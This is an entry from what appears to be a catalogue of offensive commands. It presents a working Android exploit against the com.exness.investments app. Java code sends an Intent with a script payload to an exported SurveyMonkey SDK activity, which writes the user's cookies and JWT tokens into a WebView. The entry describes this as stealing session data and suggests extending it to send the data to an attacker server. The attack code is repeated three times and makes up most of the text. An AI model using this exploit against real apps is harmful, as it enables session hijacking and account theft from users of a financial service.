---
data: >-
  final Intent intent2 = new Intent("android.intent.action.VIEW");
  intent2.putExtra("smSPageHTML","<h1>Exploited</h1><script>document.write(document.cookie)</script>");
  intent2.putExtra("smSPageURL","https://my.exness.asia/r/");
  intent2.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
  new Handler().postDelayed(new Runnable(){ @Override public void run(){
  startActivity(intent2); } },20000);
tags:
  - xss
  - intent
  - cookie-theft
type: command
output: WebView displays user's cookies for my.exness.asia and other sites
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:31.913Z'
id: 9617d7e6-2c44-4318-88c3-9420ddc5f790
verified: false
validated: true
submitted: true
---
# xss-payload-intent

## Command

```java
final Intent intent2 = new Intent("android.intent.action.VIEW"); intent2.putExtra("smSPageHTML","<h1>Exploited</h1><script>document.write(document.cookie)</script>"); intent2.putExtra("smSPageURL","https://my.exness.asia/r/"); intent2.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity"); new Handler().postDelayed(new Runnable(){ @Override public void run(){ startActivity(intent2); } },20000);
```

## Description

This command launches the intent with XSS payload to write out document.cookie in the WebView after a 20-second delay, stealing session data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 20000 | Delay in milliseconds | Yes |
| smSPageURL | Base URL: https://my.exness.asia/r/ | Yes |
| smSPageHTML | Malicious HTML with document.cookie script | Yes |
| com.exness.investments | Target package | Yes |
| com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity | Target activity | Yes |

## Examples

### Basic Usage

```java
final Intent intent2 = new Intent("android.intent.action.VIEW"); intent2.putExtra("smSPageHTML","<h1>Exploited</h1><script>document.write(document.cookie)</script>"); intent2.putExtra("smSPageURL","https://my.exness.asia/r/"); intent2.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity"); new Handler().postDelayed(new Runnable(){ @Override public void run(){ startActivity(intent2); } },20000);
```

### Advanced Usage

Modify script for exfiltration to attacker server.

## Expected Output

WebView shows "Exploited" followed by cookie values, including JWT tokens.

## Related

- [[Related Procedure]]
